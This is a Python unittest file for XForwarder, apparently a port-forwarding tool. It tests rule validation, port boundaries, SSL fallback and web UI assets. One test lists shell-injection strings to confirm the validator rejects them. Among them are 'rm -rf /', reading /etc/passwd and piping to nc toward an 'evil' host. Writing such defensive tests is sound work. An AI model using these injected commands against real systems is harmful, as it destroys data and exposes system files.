#!/usr/bin/env python3
"""
Unit tests for XForwarder UI, API Edge Cases, and Multi-Priority Validation.
Covers rule destination cascades, SSL fallback, boundary sanitization, and static asset integrity.
Standard Library unittest only.
"""

import os
import sys
import unittest
import tempfile
import json
import re

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

from core.web_server import (
    validate_rule,
    is_valid_target,
    XForwarderWebServer,
    load_config
)
from core.engine import XForwarderEngine


class TestUIAndAPIEdgeCases(unittest.TestCase):

    def test_validate_rule_arbitrary_priorities(self):
        """Verifies that validate_rule accepts arbitrary cascading priorities (P1..PN)."""
        rule = {
            "port": 9000,
            "protocol": "both",
            "destinations": [
                {"priority": 1, "type": "haproxy", "target": "2001:db8::1", "port": 9000},
                {"priority": 2, "type": "nftables", "target": "10.0.0.2", "port": 9000},
                {"priority": 3, "type": "nginx", "target": "10.0.0.3", "port": 9000},
                {"priority": 4, "type": "haproxy", "target": "2001:db8::4", "port": 9000}
            ]
        }
        valid, msg = validate_rule(rule)
        self.assertTrue(valid, f"Expected valid rule, got: {msg}")
        self.assertEqual(len(rule["destinations"]), 4)

    def test_validate_rule_empty_destinations_rejected(self):
        """Verifies that a rule without destinations is rejected."""
        rule = {"port": 8080, "protocol": "tcp", "destinations": []}
        valid, msg = validate_rule(rule)
        self.assertFalse(valid)
        self.assertIn("destination", msg.lower())

    def test_validate_rule_port_boundary_conditions(self):
        """Tests port bounds (1 to 65535)."""
        # Port 0
        valid, _ = validate_rule({"port": 0, "protocol": "tcp", "destinations": [{"target": "1.1.1.1"}]})
        self.assertFalse(valid)

        # Port 65536
        valid, _ = validate_rule({"port": 65536, "protocol": "tcp", "destinations": [{"target": "1.1.1.1"}]})
        self.assertFalse(valid)

        # Negative port
        valid, _ = validate_rule({"port": -1, "protocol": "tcp", "destinations": [{"target": "1.1.1.1"}]})
        self.assertFalse(valid)

        # Valid boundary min
        valid, _ = validate_rule({"port": 1, "protocol": "tcp", "destinations": [{"target": "1.1.1.1"}]})
        self.assertTrue(valid)

        # Valid boundary max
        valid, _ = validate_rule({"port": 65535, "protocol": "tcp", "destinations": [{"target": "1.1.1.1"}]})
        self.assertTrue(valid)

    def test_validate_rule_destination_defaults_port_if_missing(self):
        """Verifies destination inherits rule listening port when omitted."""
        rule = {
            "port": 4444,
            "protocol": "udp",
            "destinations": [{"priority": 1, "type": "haproxy", "target": "192.168.1.50"}]
        }
        valid, _ = validate_rule(rule)
        self.assertTrue(valid)
        self.assertEqual(rule["destinations"][0]["port"], 4444)

    def test_validate_rule_invalid_characters_rejected(self):
        """Prevents shell command injection characters in destination target."""
        hazards = [
            "1.2.3.4; rm -rf /",
            "1.2.3.4 && cat /etc/passwd",
            "1.2.3.4 | nc evil 1337",
            "1.2.3.4`reboot`",
            "1.2.3.4$(whoami)"
        ]
        for hazard in hazards:
            rule = {"port": 1234, "protocol": "tcp", "destinations": [{"target": hazard}]}
            valid, msg = validate_rule(rule)
            self.assertFalse(valid, f"Should reject hazard: {hazard}")

    def test_ssl_web_server_graceful_fallback(self):
        """Verifies that XForwarderWebServer handles missing SSL certs without crashing."""
        server = XForwarderWebServer(port=18090, bind_host="127.0.0.1")
        # Explicitly set invalid certificate path
        server.ssl_cert = "/tmp/nonexistent_cert_123.crt"
        server.ssl_key = "/tmp/nonexistent_key_123.key"

        # Web server start logic should catch the FileNotFoundError and stay running as HTTP
        self.assertFalse(server.is_ssl)

    def test_static_assets_integrity(self):
        """Verifies that index.html, style.css, and app.js exist and meet architectural standards."""
        web_dir = os.path.join(REPO_ROOT, "web")
        index_path = os.path.join(web_dir, "index.html")
        style_path = os.path.join(web_dir, "style.css")
        app_path = os.path.join(web_dir, "app.js")

        self.assertTrue(os.path.exists(index_path), "index.html must exist")
        self.assertTrue(os.path.exists(style_path), "style.css must exist")
        self.assertTrue(os.path.exists(app_path), "app.js must exist")

        with open(index_path, "r", encoding="utf-8") as f:
            index_content = f.read()

        with open(style_path, "r", encoding="utf-8") as f:
            style_content = f.read()

        with open(app_path, "r", encoding="utf-8") as f:
            app_content = f.read()

        # 1. Check data-theme pre-hydration script in <head>
        self.assertIn('localStorage.getItem("xfwd_theme")', index_content)
        self.assertIn('data-theme', index_content)

        # 2. Check Light & Dark theme definitions in style.css
        self.assertIn('[data-theme="light"]', style_content)
        self.assertIn('[data-theme="dark"]', style_content)

        # 3. Check hidden scrollbar on modal card
        self.assertIn('scrollbar-width: none', style_content)
        self.assertIn('.modal-card::-webkit-scrollbar', style_content)

        # 4. Check select arrow spacing styling
        self.assertIn('select.form-control', style_content)
        self.assertIn('padding-right: 40px', style_content)

        # 5. Verify quick presets was removed from index.html
        self.assertNotIn('presetHaproxyGre', index_content)
        self.assertNotIn('presetNginxTunnel', index_content)

        # 6. Verify critical DOM element IDs exist in index.html
        critical_ids = [
            "rulesContainer",
            "ruleModal",
            "securityModal",
            "confirmModal",
            "statTotalRules",
            "statActiveHaproxy",
            "statActiveNftables",
            "engineStatusBadge",
            "btnOpenAddModal",
            "searchInput",
            "batchOverrideSelect",
            "btnThemeToggle",
            "btnLoginThemeToggle",
            "loginThemeName",
            "loginScreen",
            "logConsole"
        ]
        for cid in critical_ids:
            self.assertIn(f'id="{cid}"', index_content, f"Missing critical DOM ID: {cid}")

        # 7. Verify unified login screen styling and light theme card shadow in style.css
        self.assertIn('.login-top-bar', style_content)
        self.assertIn('.login-logo', style_content)
        self.assertIn('[data-theme="light"] .login-card', style_content)

        # 8. Verify 2-column rules layout and vertical paths stacking
        self.assertIn('grid-template-columns: repeat(2', style_content)
        self.assertIn('.paths-grid', style_content)
        self.assertIn('flex-direction: column', style_content)
        self.assertIn('.rule-test-bar', style_content)
        self.assertIn('.btn-mode-pill', style_content)
        self.assertIn('.btn-path-test', style_content)

        # 9. Verify testing controls and mode switcher in app.js
        with open(os.path.join(REPO_ROOT, "web", "app.js"), "r", encoding="utf-8") as f:
            app_content = f.read()
        self.assertIn('Auto Failover', app_content)
        self.assertIn('Force P', app_content)
        self.assertIn('btn-mode-pill', app_content)
        self.assertIn('btn-path-test', app_content)


if __name__ == "__main__":
    unittest.main()
